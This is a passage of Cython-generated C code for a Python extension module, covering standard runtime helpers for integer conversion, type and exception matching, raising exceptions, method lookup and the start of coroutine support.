                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* RaiseException */
    #if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb,
                        CYTHON_UNUSED PyObject *cause) {
    __Pyx_PyThreadState_declare
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#else
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* PyObjectGetMethod */
    static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
    static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* CoroutineBase */
    #include <structmember.h>
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (Py_TYPE(ev) == (PyTypeObject*)PyExc_StopIteration) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
